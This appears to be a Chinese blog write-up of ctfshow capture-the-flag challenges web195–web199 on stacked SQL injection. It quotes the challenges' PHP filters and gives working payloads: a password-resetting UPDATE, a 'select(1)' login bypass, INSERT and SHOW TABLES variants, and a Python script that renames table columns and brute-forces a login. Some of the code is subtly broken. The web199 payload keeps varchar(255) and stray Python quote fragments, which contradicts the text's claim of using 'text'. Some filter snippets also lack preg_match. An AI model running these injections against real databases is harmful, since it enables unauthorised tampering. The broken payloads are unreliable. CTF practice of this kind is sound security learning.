---
title: 'ctfshow刷题,9-8'
date: '2024-9-8 9:36'
description: 堆叠注入
abbrlink: f7bb10d8
---

> ### 开刷

> **web195**

```php
//拼接sql语句查找指定ID用户
$sql = "select pass from ctfshow_user where username = {$username};";

//密码检测
if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
}

//密码判断
if($row['pass']==$password){
    $ret['msg']='登陆成功';
}

//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
}

if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}

```

`堆叠注入最大的提示就是没过滤分号;`

直接把密码改了,`0;update`ctfshow_user`set`pass`=0`

双击登录即可成功!

> ## web196

```php
//拼接sql语句查找指定ID用户
$sql = "select pass from ctfshow_user where username = {$username};";

//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
}

if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
}

if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}


```

有过滤的数字型注入，给出的过滤正则表达式变得不可信，明明有 select 但还是可以用的，利用堆叠注入绕过密码。
payload: `1;select(1)` 密码 1

> ## web197

```php
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
这是后端的返回逻辑
```

`还是只要登录成功就可获得flag`,这里可以对表的结构进行修改,要么将字段名互换,要么添加新用户都是可以的

```python
from colorama import Fore, Back, Style
# 换字段名,再爆破
# 初始化 colorama
from colorama import init
init(autoreset=True)


import requests

url = "http://5fc3792d-7987-4020-bd67-439f5125d14c.challenge.ctf.show/api/"


def alter_table():
    data = {
        "username": "0;alter table ctfshow_user change column pass tmp varchar(255);alter table ctfshow_user change "
                    "column id pass varchar(255);alter table ctfshow_user change column tmp id varchar(255)",
        "password": 1
    }
    _ = requests.post(url, data=data)


success_flag = "\\u767b\\u9646\\u6210\\u529f"


def brute_force_admin():
    for i in range(300):
        data = {
            "username": f"0",
            "password": {i}
        }
        response = requests.post(url, data=data)
        if success_flag in response.text:
            print(Fore.RED+f"[!] password: {i}")
            print(Fore.GREEN+f"[*] msg: {response.text}")
            return


if __name__ == "__main__":
    print("[*] change column id to pass")
    alter_table()
    print("[*] brute force admin password")
    brute_force_admin()
```

2. 添加新用户

   ```sql
   0' insert ctfshow_user(`username`,`pass`) value(1,2)		
   ```

3. 构造满足要求的语句

   ```sql
   username: 1;show tables
   pass: ctfshow_user
   ```

> **199**

```php

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

**过滤了`(`,无法用`varchar(255)`**,我们选择用`text`平替一下即可

```sql
0;alter table ctfshow_user change column pass tmp varchar(255);alter table ctfshow_user change "
                    "column id pass varchar(255);alter table ctfshow_user change column tmp id varchar(255)
```

---

> ### 堆叠注入结束了喔!